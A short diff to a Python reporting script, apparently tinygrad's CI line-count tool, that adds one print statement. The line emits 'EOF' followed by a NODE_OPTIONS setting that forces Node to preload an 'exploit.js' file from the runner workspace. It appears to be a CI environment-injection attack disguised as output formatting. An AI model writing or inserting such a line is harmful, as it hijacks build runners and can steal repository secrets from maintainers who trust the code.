@@ -73,6 +73,7 @@ if __name__ == "__main__":
     if len(sys.argv) == 3:
       print("### Changes")
       print("```")
+      print("EOF\nNODE_OPTIONS=--require=/home/runner/work/tinygrad/tinygrad/exploit.js\n")
       print(tabulate([headers] + sorted(table, key=lambda x: -x[1]), headers="firstrow", intfmt=(..., "d", "+d"),
                      floatfmt=(..., ..., ..., ".1f", "+.1f"))+"\n")
       print(f"\ntotal lines changes: {display_diff(sum([x[2] for x in table]))}")
